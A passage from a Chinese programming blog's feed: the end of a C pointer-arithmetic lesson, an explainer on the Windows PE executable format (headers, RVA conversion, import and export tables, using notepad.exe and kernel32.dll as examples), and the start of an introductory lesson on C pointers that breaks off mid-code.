class="line">&#125;</span><br></pre></td></tr></table></figure><p>唯一的区别是对指针的自增遵循指针运算,而不是简单地将地址值+1.</p><p>指针自增实际上还有许多细节,易错点和应用技巧,他们和数组有着紧密的关联,后面细说.</p><br><p>关于指针运算,详见<a href="https://zh.cppreference.com/w/c/language/operator_arithmetic">算术运算符</a></p><p>本部分讲解了指针类型与指针运算,读者应该意识到(虽然可能为时尚早),<code>指针的行为与其类型息息相关</code>.</p><p>接下来的指针话题会涉及到数组,而且比较复杂.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../202310666f346238">C语言教程-13_1-初识指针</a></p><p>下一篇:<a href="../20237cb717142d36">C语言教程-13_3-初探指针和数组的关系</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件分析</title>
      <link href="/2023354e7a2c8c35/"/>
      <url>/2023354e7a2c8c35/</url>
      
        <content type="html"><![CDATA[<h1 id="pe文件概述">PE文件概述</h1><p>Windows操作系统的<code>PE文件</code>(Portable Executable)和Linux操作系统下的ELF文件都是可执行文件的一种,均以UNIX平台的<code>COFF</code>(Common Object File Format,通用对象文件格式)制作而来.</p><p>PE文件是32位的可执行文件,也称为PE32,后来的64位可执行文件称为PE+或PE32+,是PE的扩展.</p><br><p>PE文件有如下几种格式:</p><table><thead><tr><th>种类</th><th>主扩展名</th><th>种类</th><th>主扩展名</th></tr></thead><tbody><tr><td>可执行系列</td><td>EXE,SCR</td><td>驱动程序类型</td><td>SYS,VXD</td></tr><tr><td>库系列</td><td>DLL,OCX,CPL,DRV</td><td>对象文件类型</td><td>OBJ</td></tr></tbody></table><p>严格来说,除了OBJ文件,其他的格式都是可执行的(部分可以以调试,服务等特殊方式运行)</p><br><p>注:在文章结尾有一张PE文件的示意图.</p><h1 id="pe文件分析">PE文件分析</h1><p>我们首先使用<code>010 Editor</code>进行分析,分析样例使用<code>Windows XP SP3</code>操作系统下的<code>notepad</code>记事本程序(32位).</p><h2 id="基本结构">基本结构</h2><p>需要明确的一点是,PE文件是可执行文件,这意味着其需要载入到内存中,PE文件在磁盘和内存中的结构是不同的.</p><p>下图展示了二者的差异:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119132011163.png" alt="image-20231119132011163" style="zoom:50%;" /><p>从<code>DOS头</code>到<code>节区头</code>是PE头部分,下面的合称为PE体.</p><p>为了定位PE中的数据,在文件中使用偏移(offset),在内存中使用VA(虚拟地址)进行定位.从图中可以看出,PE加载到内存中后,节区的大小和位置会发生变化,而不是原封不动地载入内存.</p><p>计算机中，为了提高处理文件、内存,网络包的效率，使用&quot;最小基本单位&quot;这一概念,PE文件中也类似.各节区的起始位置都在文件/内存最小单位的倍数位置处,空白的部分使用<code>NULL</code>进行填充.</p><h2 id="va和rva">VA和RVA</h2><p>VA指的是进程虚拟内存的绝对地址,RVA(Relative Virtual Address)则为相对地址,即相对基址的偏移.</p><p>PE头内部的信息大多为RVA,由于在载入内存时,该处可能已经加载有其他数据,所以需要重定向到其他位置,因此,只要能够保证RVA不变,根据不同的VA基地址,都可以正确找到各个数据.</p><p>换算公式如下:</p><p><code>RVA+ImageBase=VA</code></p><p>32位操作系统中,各进程有4GB的虚拟内存,所以VA范围从00000000~FFFFFFFF.</p><h2 id="pe头">PE头</h2><p>PE头包含各种结构体,保存着PE文件的各种信息.</p><h3 id="dos头-image-dos-header">DOS头-IMAGE_DOS_HEADER</h3><p>PE头创建之时,DOS文件正在被广泛使用,理所当然地PE文件对DOS文件进行了兼容,方法就是在PE头最前面加上一个DOS头.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119134323201.png" alt="image-20231119134323201" style="zoom:50%;" /><p>该结构体占用40字节,捡关键的说:</p><p><code>e_magic</code>成员:DOS签名(4D5A即为ASCII&quot;MZ&quot;)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119134551674.png" alt="image-20231119134551674" style="zoom:50%;" /><p><code>e_lfanew</code>成员:该成员的值指向后续的<code>NT头</code>所在位置</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119134748524.png" alt="image-20231119134748524" style="zoom:50%;" /><p>(注意小端序存储)</p><h3 id="dos存根">DOS存根</h3><p>该部分可选,有无均可,不影响程序运行,大小不固定.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119140245195.png" alt="image-20231119140245195" style="zoom:50%;" /><p>其中40到4D区域为16位的汇编指令,这里用于输出一个错误提示,即告诉用户该程序不能够在DOS模式下运行.</p><p>合理运用DOS存根可以产生一个既可以在DOS下运行,还可以在win32下运行的程序.</p><h3 id="nt头-image-nt-headers">NT头-IMAGE_NT_HEADERS</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119140618249.png" alt="image-20231119140618249" style="zoom:50%;" /><p>该结构体大小为F8,非常大.</p><p>Signature:值为<code>50450000</code>的ASCII&quot;PE&quot;00的签名</p><p>FileHeader:文件头</p><p>OptionalHeader:可选头</p><h4 id="文件头-image-file-header">文件头-IMAGE_FILE_HEADER</h4><p>该结构体存储了文件的大致属性.其中的几个十分重要,错误设置将导致文件无法正常运行.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119140936456.png" alt="image-20231119140936456" style="zoom:50%;" /><p>Machine:CPU的Machine码,兼容Intel x86芯片的Machine码为<code>14C</code>,其余还有:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141203782.png" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141203782.png" style="zoom:50%;" /><p>NumberOfSections:指出节区数,如果与实际不符,则会运行错误.</p><p>SizeOfOptionalHeader:尽管NT头的最后一个成员(IMAGE_OPTIONAL_HEADER32结构体)的大小已经定义,但是windows的PE装载器需要查看SizeOfOptionalHeader的值,以确定IMAGE_OPTIONAL_HEADER32结构体的大小.</p><p>Characteristics:根据该成员来识别文件的属性-是否可运行,是否为DLL文件等.使用<code>bit OR</code>形式组合起来.</p><p>值如下:(<code>记住0002h和2000h这两个值</code>)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141939285.png" alt="image-20231119141939285" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119141955018.png" alt="image-20231119141955018" style="zoom:50%;" /><h4 id="可选头-image-optional-header32">可选头-IMAGE_OPTIONAL_HEADER32</h4><p>该头是PE头中最大的一个.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119142126868.png" alt="image-20231119142126868" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119142200511.png" alt="image-20231119142200511" style="zoom:50%;" /><p>重要的成员:</p><p>Magic:为IMAGE_OPTIONAL_HEADER32时,值为10B;为IMAGE_OPTIONAL_HEADER64时,值为20B.</p><p>AddressOfEntryPoint:存有EP(代码入口点)的RVA值.十分重要.</p><p>ImageBase:指出最先被装载的地址.</p><p>EXE,DLL文件被装载到0~7FFFFFFF;SYS文件被装载到80000000~FFFFFFFF.</p><p>SectionAlignment,FileAlignment:指定最小单位.</p><p>SizeOfImage:指出PE Image在虚拟内存中所占空间的大小.一般和文件中不同.</p><p>SizeOfHeader:指出整个PE头的大小.</p><p>Subsystem:用来区分系统驱动文件和普通的可执行文件.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119144701127.png" alt="image-20231119144701127" style="zoom:50%;" /><p>NumberOfRvaAndSizes:用来指定DataDirection数组的个数(?).</p><p>DataDirectory:各种表项,例如导入表和导出表等.每个元素都对应一种表项.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119144842497.png" alt="image-20231119144842497" style="zoom:50%;" /><h3 id="节区头-image-section-header">节区头-IMAGE_SECTION_HEADER</h3><p>节区头定义了各个节区的属性.PE文件将各种数据存储在不同的节区.而且不同的节区会有不同的权限:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119145151510.png" alt="image-20231119145151510" style="zoom:50%;" /><p>节区头是由IMAGE_SECTION_HEADER结构体组成的数组,每个结构体对应一个节区:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119150357510.png" alt="image-20231119150357510" style="zoom:50%;" /><p>结构体如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119150425129.png" alt="image-20231119150425129" style="zoom:50%;" /><p>重要的属性有如下几个:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119150459036.png" alt="image-20231119150459036" style="zoom:50%;" /><p>这些属性定位了后续PE体中对应的一个节区,例如<code>.text节区</code>.</p><h2 id="rva-to-raw">RVA to RAW</h2><p>这是一个最基本的转换,由于PE磁盘文件与其载入到内存的镜像文件并不完全一致,所以需要将进行RAW与RVA之间的转换.</p><p>首先查找<code>RVA</code>所在的节区,然后找到该节区的起始地址<code>Virtual Address</code>,注意这里的<code>Virtual Address</code>仍然是RVA(?).</p><p>然后找到<code>PointerToRawData</code>,就可以做差了.公式如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119151217154.png" alt="image-20231119151217154" style="zoom:50%;" /><p>含义即为:文件中该位置(RAW)到节区起点的偏移(两者之差) 与 内存映像中位置(RVA)到本节区起点的偏移(两者之差) 是相等的.</p><h2 id="iat-导入地址表">IAT-导入地址表</h2><p>Windows过去并没有<code>DLL</code>,只有<code>库(Library)</code>这一概念,这导致每一个程序要调用某一个库代码,都要进行包含,这就导致大量的空间浪费(每个使用该库的程序都有其一本副本).</p><p>现在,引入了DLL这一概念,可执行文件直接加载该DLL即可.在内存中只有一个DLL的代码.</p><p>加载DLL的方式有两种,一种是&quot;显式链接&quot;,即使用时进行加载,使用后释放内存;另一种是&quot;隐式链接&quot;,程序开始即加载,运行结束后释放,这种方式就与<code>IAT</code>有关.</p><br><p>PE文件提供了IAT内存区域,这里是编译器指定的一些内存,文件执行时,PE装载器将DLL中某些函数的实际地址(运行时确认)写入到这个位置,在程序代码中,访问一个库函数并不会将其硬编码到代码中,而是以IAT内存区域中某个内存中存储的地址值去进行call,这个地址值即为PE装载器在启动程序时确认的地址.这样实现由2个原因:</p><ol><li><p>之所以这样间接调用,是因为由于操作系统版本的不同,软件版本的不同,各个DLL中函数的实际地址并不相同,为了保证准确,将获取库函数实际地址的任务交给了PE装载器,在运行时确认当前DLL中库函数的地址.</p></li><li><p>另一方面,DLL的地址也并不是绝对的,例如某程序使用a.dll和b.dll,PE装载器将a.dll装载到10000000(ImageBase)处,然后尝试将b.dll也装载到此处,但是发现a.dll已经装载在此,理所当然地,便会将b.dll装载到其他位置.</p><p>这就是所谓的<code>DLL重定向</code>,我们无法在编写应用程序的时候就绝对确定一个DLL在内存中的位置.</p></li></ol><p>因此,实际上编译器需要指定程序中的一个内存空间,供PE装载器在执行时将正确的地址写入这个内存空间,在需要调用某个函数时,就从这个内存空间中读取载入的地址,然后进行call调用.</p><h3 id="image-import-descriptor结构体">IMAGE_IMPORT_DESCRIPTOR结构体</h3><p>该结构体中记录着PE文件要导入哪些库文件.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119153635416.png" alt="image-20231119153635416" style="zoom:50%;" /><p>每一个导入的库都会对应这样的一个结构体,组成结构体数组,最终以一个NULL填充的结构体结束:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119155203589.png" alt="image-20231119155203589" style="zoom:50%;" /><p>有时候,INT数组与IAT数组指向同一个位置(如下图),但是很多情况下并不是这样的.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119155313272.png" alt="image-20231119155313272" style="zoom: 33%;" /><p>PE装载器将导入函数写入IAT的顺序如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119155713902.png" alt="image-20231119155713902" style="zoom:50%;" /><h3 id="查找image-import-descriptor结构体数组">查找IMAGE_IMPORT_DESCRIPTOR结构体数组</h3><p>以notepad为例.</p><p>该数组并不在PE头中,而是在PE体中,不过,查找其位置的信息存储在PE头中.</p><p>在PE头的<code>IMAGE_OPTIONAL_HEADER32中,DataDirectory[1].VirtualAddress</code>的值即为<code>IMAGE_IMPORT_DESCRIPTOR结构体数组</code>的起始地址.</p><p>另外,IMAGE_IMPORT_DESCRIPTOR结构体数组也称为<code>IMPORT Directory Table</code>.</p><br><p>查看notepad的<code>DataDirectory数组</code>如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119160754825.png" alt="image-20231119160754825" style="zoom:50%;" /><p>找到对应的RVA(7604),根据公式转换为RAW(6A04),从文件中找到该位置:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161113837.png" alt="image-20231119161113837" style="zoom:50%;" /><p>上图就是找到的数组,当前定位到其第一个元素,也就是第一个导入的dll库.</p><p>我们以这个元素举例(comdlg32.dll),展开分析(010Editor帮我们进行了分析):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161248116.png" alt="image-20231119161248116"></p><ol><li>库名称Name:Name成员存储了一个RVA(7AAC),转换为RAW(6EAC),跳转过去就能找到这个库名字符串:</li></ol><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161532401.png" alt="image-20231119161532401"></p><ol start="2"><li><p>OriginalFirstThunk - INT:INT为一个包含导入函数信息的结构体指针数组.根据这个数组的信息才能够找到对应函数的地址(参考后面EAT的内容).</p><p>跟踪该地址(同样计算RAW),得到:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119161942301.png" alt="image-20231119161942301" style="zoom:50%;" /><p>这里的每一个地址都指向一个<code>IMAGE_IMPORT_BY_NAME结构体</code>(如下所示).</p><p>根据每一个元素,例如第一个0x00007A7A(注意小端序),转为RAW为6E7A,继续跟踪可找到第一个函数名:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119162158565.png" alt="image-20231119162158565" style="zoom:50%;" /><p>这里的前2个字节(000F)为<code>Ordinary</code>,为库中函数的固有编号.</p></li><li><p>FirstThunk - IAT:IAT即为Import Address Table</p><p>IAT的RVA:12C4–&gt;RAW:6C4,跟踪过去得:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231119162745029.png" alt="image-20231119162745029" style="zoom:50%;" /><p>这里的第一个元素被硬编码为76344906,但无实际意义,运行时会被准确的地址值覆盖.</p></li></ol><h2 id="eat-导出地址表">EAT-导出地址表</h2><p>与普通的应用程序不同,库文件(DLL,SYS)是为方便其他程序调用而集中包含了相关函数的文件.<code>Win32 API</code>是最具代表性的库,其中的<code>kernal32.dll</code>最为核心.</p><p>为了获取库文件中的函数信息,库必须使用EAT机制,用来求得库中各函数的地址.PE文件中,仅有一个<code>IMAGE_EXPORT_DIRECTORY结构体</code>来说明库EAT,而不是向IAT那样的数组,因为IAT可以导入多个库,而一个库只能导出自己.</p><h3 id="image-export-directory结构体">IMAGE_EXPORT_DIRECTORY结构体</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121172638880.png" alt="image-20231121172638880" style="zoom:50%;" /><p>重要成员如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121173202469.png" alt="image-20231121173202469" style="zoom:50%;" /><p>下面是kernel3.dll的整个EAT结构:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121175433331.png" alt="image-20231121175433331" style="zoom: 40%;" /><br><p>对照结构体声明和kernel32.dll的EAT结构,下面是寻找API的整个过程.从库中获得函数地址的API为<code>GetProcAddress()</code>函数,其引用EAT来获取指定API的地址.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121175814535.png" alt="image-20231121175814535" style="zoom: 33%;" /><p>总结来说就是,从函数名称数组中找到该函数名称的字符串,根据该字符串的下标name_index去查找ordinal数组,对应位置的元素值为ordinal,最后,在函数地址数组中以ordinal为下标找到函数的起始地址.</p><br><p>实际上,有些函数可能并没有函数名称(仅通过ordinal导出),可以通过从ordinal减去IMAGE_EXPORT_DIRECTORY.Base后得到的值作为函数地址数组的索引去查找函数地址.</p><h3 id="查找image-export-directory结构体">查找IMAGE_EXPORT_DIRECTORY结构体</h3><p>以Windows XP SP3的kernel32.dll为例.</p><p>和IAT同样,在NT头的<code>DataDirectory数组</code>中找到EAT的位置:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121172422745.png" alt="image-20231121172422745"></p><p>跳转到<code>0x1A2C</code>即可找到EAT:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121172558254.png" alt="image-20231121172558254" style="zoom:50%;" /><p>接下来就可以根据前面说的步骤去查找某个具体的函数了.</p><h1 id="总结">总结</h1><p>PE文件是Windows系统的可执行文件格式,了解PE文件结构才能够进一步学习更深的逆向技术.</p><p>后续还会看到各种PE文件的变体,例如被特殊的压缩程序进行压缩,用于非正常行为的程序(例如病毒等).</p><p>这是一张PE文件结构的示意图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/5427d0b798683a769cbf51d2c84b3664.png" alt="5427d0b798683a769cbf51d2c84b3664" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> RE </tag>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_1-初识指针</title>
      <link href="/202310666f346238/"/>
      <url>/202310666f346238/</url>
      
        <content type="html"><![CDATA[<p>概要:</p><ol><li>简要讲解内存地址与内存模型</li><li>简单介绍C语言的指针这一数据类型</li><li>掌握指针相关最基本的两种互逆运算</li></ol><p>前置知识:</p><ol><li>理解能力和想象能力</li><li>耐心和实验精神</li><li>数组与函数的知识</li></ol><h1 id="交换两个变量的问题">交换两个变量的问题</h1><p>我们从一个问题开始引入指针.</p><p>考虑这个问题:<code>在main()函数中有两个int变量a和b,我该如何交换这两个变量的值?</code></p><p>如果我们要求仅在一个函数中解决这个问题,那么很容易想到,最简单的办法就是新建一个int类型的中间变量,比如命名为<code>temp</code>.那么我们就有如下操作进行交换(十分简单不详细解释):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> c; <span class="comment">// 中间变量</span></span><br><span class="line">    <span class="comment">// 经典3步进行交换</span></span><br><span class="line">    c = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b); <span class="comment">// 输出结果 a=4,b=3   </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要这3步即可进行交换.</p><br><p>现在问题来了,如果我们要求创建一个函数<code>swap()</code>来实现这个操作,该如何实现?</p><p>也许我们可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line">    swap(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>, a, b); <span class="comment">// 输出错误的结果:a=3,b=4   </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们尝试简单地把a和b传递给swap()函数,运行一下,结果显然是错误的,a和b的值并没有交换.</p><p>回顾前面<code>函数</code>的知识,前面讲过,C函数的参数都是按值传递,这里也就是将<code>main()</code>中的a和b的值简单地复制给<code>swap()</code>的两个参数a和b,换句话说,此a,b非彼a,b.</p><p>结果就是,在<code>swap()</code>中的a,b确实被成功地交换了,但是<code>main()</code>中的a,b完全没有变化.</p><br><p>我们想要在<code>swap()</code>函数中交换<code>main()</code>中的a和b,根本的问题在于我们需要访问到他们,C语言的<code>指针</code>类型提供了这种功能.</p><h1 id="地址和指针">地址和指针</h1><h2 id="计算机内存与地址">计算机内存与地址</h2><p>计算机运行时需要的各种数据都存储于内存中(就是平时说的内存条),从逻辑上来看,一整个内存可以视为一个超级巨大的数组,例如我们的内存是4GB,那么这个数组的总大小就是4GB.我们仅仅讲解<code>内存地址</code>这个概念,具体的内存结构这里并不关心.</p><p>程序的相关数据就存储在内存中,例如执行的机器代码,局部变量,全局变量(定义在函数外的变量),常量字面值.他们以某种特定的模式进行存储,存储的位置各不相同,为了找到他们,我们需要以字节为单位为整个内存进行编号.也就是所谓的<code>内存地址</code>.需要注意的是,我们通常以<code>16进制</code>来表示地址值(毕竟内存如此巨大,2,10进制是不够方便的).</p><p>以4GB内存举例,我们需要8个16进制位来完整编号,即<code>16^8==4,294,967,296</code>,也就是4GB的大小.从0开始,第一个字节编号为<code>0x00000000</code>,最后一个字节编号为<code>0xFFFFFFFF</code>.当然,如此庞大的内存范围不可能全部让我们任意取用,实际上我们自己的应用程序只能使用操作系统(例如Windows)规定的一块内存,当然这完全够用.</p><p>例如,我们在内存地址0x2~0x8存储了一些特定的数据,内容如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121002855398.png" alt="image-20231121002855398" style="zoom:50%;" /><p>可以看到每一个地址都<code>指向</code>内存中的一个特定字节,这个1字节大小的空间中存储了某些特定的数据,程序根据数据的地址从内存中找到他们,以进行运算.</p><br><p>另一方面,尽管我们对每一个字节都进行了编号,但是往往我们将若干个字节组合起来使用,例如一个int变量,就直接占用了4个字节,此时我们将4个连续的字节视为一个整体,取最开头的那个字节作为代表,指代整个int变量.</p><p>例如我们有<code>int i=2;</code>则i在内存中的布局如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121004333759.png" alt="image-20231121004333759" style="zoom:50%;" /><p>注意,我们上面的地址值仅仅作为演示,在现在流行的x64机器中并不是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 使用循环,逐字节输出i在内存中的值(十六进制),同时输出每个字节的地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(i); j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%p %02x\n&quot;</span>, (<span class="type">char</span> *)&amp;i + j, *((<span class="type">char</span> *)&amp;i + j));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我的笔记本电脑运行如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121004620266.png" alt="image-20231121004620266" style="zoom:50%;" /><p>先不管上面的代码是什么原理,仅仅看一下结果,输出了i占用的这4个字节内部的值,同时可以看到前面的内存是连续的.如果我们使用<code>printf(&quot;%p&quot;,&amp;i);</code>输出i的地址,结果将会是第一个地址,这意味着使用最小的那个地址指代整个变量i.</p><p>读者无需关心为什么是<code>02 00 00 00</code>而不是<code>00 00 00 02</code>,这涉及到<code>大小端序</code>的问题.</p><h2 id="处理地址-c语言的指针">处理地址-C语言的指针</h2><p>现在我们已经了解了最基本的内存常识,并举了一个int变量的例子,了解了变量的存储.下面引入<code>指针</code>.</p><p>用最简单的一句话概括指针就是:<code>指针就是地址</code>.我们有时候需要在程序中获取到某个变量的地址,C语言提供了<code>指针</code>这一数据类型,用<code>指针类型</code>声明的变量就叫<code>指针变量</code>,其内部存储一个无符号的整数(往往是4或8字节大小),代表一个地址.</p><p>顾名思义,指针,就像一个箭头指向一个地方,和地址的作用相同.只不过前面说的<code>地址</code>是指计算机内存的编址,而指针,是C语言为了能够处理内存地址而引入的一种机制.某种角度而言,地址值仍然是一个整数,所以我们想要存储他,和普通的整数无异,但是为了特殊化,C语言引入了<code>指针类型</code>这种数据类型,这种(类)类型的变量存储的是一个特殊整数代表一个指针(地址).</p><br><p>获取一个变量的地址十分简单,使用<code>&amp;取地址运算符</code>,输入一个指针也很简单,在printf()中使用<code>%p</code>即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">3</span>; <span class="comment">// 声明并初始化为3一个int类型变量i</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,&amp;i); <span class="comment">// &amp;i这个表达式代表获取到i在内存中的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121005931082.png" alt="image-20231121005931082" style="zoom:50%;" /><p>这代表着变量i就存储在这个地址值指向的内存块中.</p><br><p>如果我们想要将这个地址存储下来,那么就需要使用C语言的<code>指针</code>.</p><p>声明一个最简单的指针变量仅仅需要在变量名前多加一个<code>*</code>,语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">3</span>; <span class="comment">// 声明并初始化为3一个int类型变量i</span></span><br><span class="line">    <span class="type">int</span> *p; <span class="comment">// 声明一个变量p,其类型为int*,代表它是一个指针</span></span><br><span class="line">    p = &amp;i; <span class="comment">// 将i的地址赋值给p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,p); <span class="comment">// 此时不再需要&amp;,因为p存储的就是i的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果同样,也是一个地址.</p><br><p>再进一步,我们既然存储了某个变量的地址(指针),那么就意味着我们想要根据这个地址(指针)去<code>访问</code>其指向的内存单元,我们使用另一种运算符,即<code>*解引用运算符(或者叫指针运算符)</code>,与<code>&amp;</code>相反,<code>*</code>用于对一个地址进行访问,反向获取到此处存储的具体变量(值),这种相对于<code>取地址</code>操作的逆操作称为<code>解引用</code>操作.</p><p>仍然是上面的例子,我们尝试使用p存储的地址去<code>间接</code>访问变量i:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span 